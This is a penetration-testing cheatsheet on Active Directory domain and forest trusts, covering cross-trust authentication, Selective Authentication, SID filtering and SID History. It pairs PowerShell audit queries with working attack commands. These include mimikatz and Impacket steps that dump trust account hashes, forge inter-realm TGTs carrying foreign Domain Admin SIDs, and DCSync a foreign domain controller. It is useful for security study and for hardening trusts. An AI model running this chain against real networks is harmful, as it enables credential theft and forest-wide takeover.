---
aliases:
  - Selective Auth
  - SID Filtering
  - SID History
  - Trust Authentication
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - Domain & Forest Trusts]]"
  - "[[Trust Abuse]]"
---
# AD - Domain & Forest Trusts - Authentication & SID Filtering

***

## Authentication Types Cross-Trust

| **Auth Type** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Kerberos cross-realm | Inter-realm TGT (referral) | Standard. |
| Inter-realm TGT signed by trust password | Trust account hash | Forging target. |
| TGS request to foreign KDC | Service ticket from foreign | Standard. |
| Foreign KDC validates inter-realm TGT | Trust password verification | Standard. |
| NTLM cross-trust | NTLM auth to foreign domain | Less common. |
| Pass-through auth (NTLM) | Local DC forwards auth to foreign | Standard. |
| Forest-wide auth scope | All foreign users can auth | Default. |
| Selective Auth scope | Only allowed principals | Hardening. |
| Resource-side ACE check | `Allowed-To-Authenticate` ACE | Granular. |
| `whoami /upn` cross-trust | UPN reveals auth realm | ID. |
| `whoami /groups` cross-trust | Foreign + local groups merged | Token expansion. |
| Token bloat | Many SIDs across trusts | Performance issue. |
| `tokenGroupsGlobalAndUniversal` | Cross-domain groups via GC | Standard. |
| Universal group membership caching | Per-site optimization | Edge. |
| Smart card cross-trust | Adjacent — Kerberos with PKINIT | Modern. |
| Modern Cloud Sync | Azure AD Connect impacts | Edge. |
^ad-auth-types

### Cross-trust auth flow

```
1. User in dom-A wants to access resource in dom-B
2. Local DC issues inter-realm TGT signed by trust password (dom-A → dom-B)
3. User presents inter-realm TGT to dom-B KDC
4. dom-B KDC validates trust password → issues TGS for resource
5. User presents TGS to resource server → access granted (if authorized)

# View Kerberos tickets after cross-trust access
klist
# Look for ticket type "ms-srv-realm" = inter-realm TGT
```

___

## Selective Authentication (Hardening)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Default trust = forest-wide auth | Permissive | Standard. |
| Selective Auth = whitelist principals | Hardening | Optional. |
| `Allowed-To-Authenticate` extended right | Per-resource ACE | Granular. |
| `quarantineDomain` flag enabled | SelectiveAuth marker | LDAP. |
| Resource-side enforcement | Server checks ACE | Standard. |
| Per-server explicit | Each server needs ACE | Operational overhead. |
| Group-based | Add group → all members allowed | Common. |
| Misconfigured: Authenticated Users in ACE | Bypass | Common. |
| Misconfigured: nested groups | Group A in ACE → indirect access | Common. |
| Bypass: pre-cached creds | Already-cached TGT | Edge. |
| Detection: Event 4625 (logon fail) | Selective Auth blocks | Defender. |
| Per-server Selective Auth | Most secure | Granular. |
| Combine with SID Filtering | Defense in depth | Hardening. |
| Modern best practice | Selective Auth on all external trusts | Recommended. |
| Audit: principals allowed cross-trust | Per-trust check | Compliance. |
| Microsoft tutorial | docs.microsoft.com | Reference. |
^ad-auth-selective

### Selective Auth audit

```powershell
# Trusts with Selective Auth enabled
Get-ADTrust -Filter * | Where {$_.SelectiveAuthentication -eq $true}

# Resources allowing foreign auth (Allowed-To-Authenticate ACE)
$foreignDomain = "PARTNER"
Get-ADObject -Filter {ObjectCategory -eq "computer" -or ObjectCategory -eq "user"} -SearchBase "DC=dom,DC=local" |
  ForEach-Object {
    $dn = $_.DistinguishedName
    Get-Acl "AD:$dn" |
      Select -ExpandProperty Access |
      Where {
        $_.ActiveDirectoryRights -match "ExtendedRight" -and
        $_.ObjectType -eq "68B1D179-0D15-4D4F-AB71-46152E79A7BC"  # Allowed-To-Authenticate GUID
      } |
      Select @{n='Object';e={$dn}},IdentityReference,ActiveDirectoryRights
  } | Where {$_.IdentityReference -match $foreignDomain}
```

___

## SID Filtering

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Default forest trust: SID filtering enabled | Defense | Standard. |
| Default external trust: SID filtering enabled (Quarantined) | Defense | Standard. |
| Default intra-forest: SID filtering disabled | Convenience | Standard. |
| Why SID Filter? | Prevents cross-forest privesc via SID History | Defense. |
| `Quarantined Domain` flag (0x4) | LDAP attribute | Marker. |
| `Treat-As-External` flag (0x40) | Forest trust treated as external | Hardening. |
| What is filtered? | Foreign SIDs not in trusted forest | Defense. |
| Inter-realm TGT SID validation | KDC drops unfiltered SIDs | Standard. |
| Cross-forest SID History injection | Bypass SID filtering = forest takeover | Critical attack. |
| Disable SID filtering = back-compat | Edge — risky | Operational. |
| `netdom trust /quarantine:no` | Disable SID filter | Risky command. |
| Cross-forest with SID filter off | Easy SID History abuse | Critical risk. |
| Defense: keep SID filter on always | Best practice | Hardening. |
| Audit: SID filter status per trust | Compliance check | Standard. |
| Detection: Event 4670 (TDO modify) | Defender alarm | Defender. |
| `enableSIDHistory` legacy flag | Legacy migration | Edge. |
^ad-auth-sidfilter

### SID Filtering status check

```powershell
# All trusts SID filtering status
Get-ADTrust -Filter * | 
  Select Name,SIDFilteringForestAware,SIDFilteringQuarantined,Source,Target

# Manual decode via trustAttributes
Get-ADTrust -Filter * -Properties trustAttributes | 
  Select Name,@{n='SIDFilter';e={
    if ($_.trustAttributes -band 0x4) {"Quarantined (SID Filter ON)"}
    elseif ($_.trustAttributes -band 0x40) {"Treat-As-External (filtering)"}
    else {"NO FILTER (RISKY)"}
  }}
```

```cmd
:: Native check
netdom trust dom.local /domain:partner.com /quarantine /verbose

:: Output: "Currently NOT enforcing" = filtering DISABLED (RISKY)
```

___

## SID History

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `sIDHistory` attribute on user | Stores prior domain SIDs | LDAP. |
| Purpose: domain migration | User retains access from old SID | Standard. |
| Format: array of SIDs | Multiple values | LDAP. |
| Token includes sIDHistory | Auth tokens include all | Standard. |
| Cross-trust + SID History abuse | Forge inter-realm TGT with SID History | Critical attack. |
| Without SID Filtering | Foreign SIDs accepted | Vulnerability. |
| With SID Filtering | Foreign SIDs dropped | Defense. |
| ExtraSids in TGT | Custom SID injection | Forging. |
| Forge TGT with admin SID | Mimikatz / Rubeus | Attack tool. |
| Migration tool ADMT | Sets sIDHistory | Standard. |
| `Get-ADUser -Properties sIDHistory` | Check users | Audit. |
| `Set-ADObject -Replace @{SIDHistory=...}` | Privileged set | Risky. |
| Audit users with sIDHistory | Compliance | Standard. |
| Suspicious: non-migration users with sIDHistory | Investigate | Detection. |
| Cleanup post-migration | Remove sIDHistory after success | Hardening. |
| BloodHound HasSIDHistory edge | Tool support | Visualize. |
^ad-auth-sidhistory

### SID History audit

```powershell
# Users with SID History
Get-ADUser -Filter * -Properties sIDHistory |
  Where {$_.sIDHistory} |
  Select Name,SamAccountName,sIDHistory

# Decode SID History
$user = Get-ADUser "migrated_user" -Properties sIDHistory
$user.sIDHistory | ForEach-Object {
  [PSCustomObject]@{
    SID = $_.Value
    Domain = (Get-ADDomain -Identity ($_.AccountDomainSid.Value) -ErrorAction SilentlyContinue).Name
  }
}

# BloodHound
# MATCH p=(u:User)-[:HasSIDHistory]->(d:Domain) RETURN p
```

___

## Forging Inter-Realm TGT

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Inter-realm TGT signed by trust password | Trust account hash | Forging target. |
| Trust account hash via DCSync | Privileged required | DCSync target. |
| Forge inter-realm TGT with mimikatz | `kerberos::golden /service:krbtgt/<foreign-realm> ...` | Tool. |
| `/service:krbtgt/<foreign>` | Specifies target realm | Standard. |
| `/sids:<foreign-DA-SID>` | ExtraSids = foreign DA membership | Critical. |
| With SID Filtering: ExtraSids dropped | Defense kicks in | Standard. |
| Without SID Filtering: ExtraSids accepted | Forest takeover | Critical. |
| Cross-forest privesc via TGT forge | If SID filter disabled | Attack chain. |
| Diamond Ticket variant cross-trust | Use real PAC | Edge. |
| Detection: Event 4768 (TGT request) | Defender | Adjacent. |
| Detection: AS-REP to KDC of foreign realm | Anomaly | Defender. |
| Persistent forging | If trust password not rotated | Long-term access. |
| Cross-trust krbtgt rotation | Rotate trust password | Defense. |
| Trust password rotation script | PowerShell native | Adjacent. |
| Modern: TGT delegation disabled cross-forest | Default | Defense. |
| MS-DRSR DCSync via cross-trust | Edge — privileged | Edge. |
^ad-auth-tgtforge

### Inter-realm TGT forge example (privileged + risky)

```cmd
:: Mimikatz — requires trust password hash (from DCSync)
kerberos::golden /domain:dom-A.local ^
  /sid:S-1-5-21-A-A-A ^
  /sids:S-1-5-21-B-B-B-519 ^
  /rc4:<TRUST_PASSWORD_HASH> ^
  /user:Administrator ^
  /service:krbtgt/dom-B.local ^
  /target:dom-B.local ^
  /ticket:intertgt.kirbi

:: Inject ticket
kerberos::ptt intertgt.kirbi

:: Now access dom-B as DA via SID History injection
:: BUT: only works if SID Filtering disabled on dom-B trust
```

___

## Trust Account Compromise Chain

| **Step** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Step 1: DCSync local domain | `secretsdump dom-A/admin:pass@DC` | Standard. |
| Step 2: Identify trust accounts | Look for `<NETBIOS>$` entries | Output. |
| Step 3: Get trust password hash | NTLM hash from DCSync | Direct. |
| Step 4: Forge inter-realm TGT | mimikatz or Rubeus | Tool. |
| Step 5: Inject ticket | ptt | Use. |
| Step 6: Access foreign domain | If SID Filter disabled, with ExtraSids | Critical chain. |
| Alternative: ASREProast trust account | If preauth disabled | Edge. |
| Alternative: Kerberoast trust account | If SPNs set | Edge. |
| Trust account in DA group? | Privesc shortcut | Edge. |
| Trust password rotation period | 30 days default | Window. |
| Computers + trust account = inter-realm SPN | Like RPC | Edge. |
| BloodHound tracks trust accounts | Custom Cypher | Adjacent. |
| Detection: anomalous DCSync + forging | Defender | Adjacent. |
| Defender for Identity | Trust attack alerts | Defender. |
| Microsoft RFC | KB articles on trust attacks | Reference. |
| Black Hat / DEF CON talks | Cross-forest attacks | Education. |
^ad-auth-trustchain

### Full chain example

```bash
# Step 1: DCSync to get trust account hash
impacket-secretsdump dom-A.local/admin:pass@DC -just-dc

# Look for: PARTNER$:1234567890ABCDEF... (trust account NT hash)

# Step 2: Forge inter-realm TGT (Linux with Impacket ticketer)
ticketer.py -nthash <TRUST_HASH> \
  -domain-sid <DOM-A-SID> \
  -domain dom-A.local \
  -extra-sid <DOM-B-DA-SID-519> \
  -spn krbtgt/dom-B.local \
  Administrator

# Step 3: Use TGT to access dom-B
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass dom-B-dc.dom-B.local

# Critical caveat: only works if SID Filtering disabled on dom-A->dom-B trust
```

***
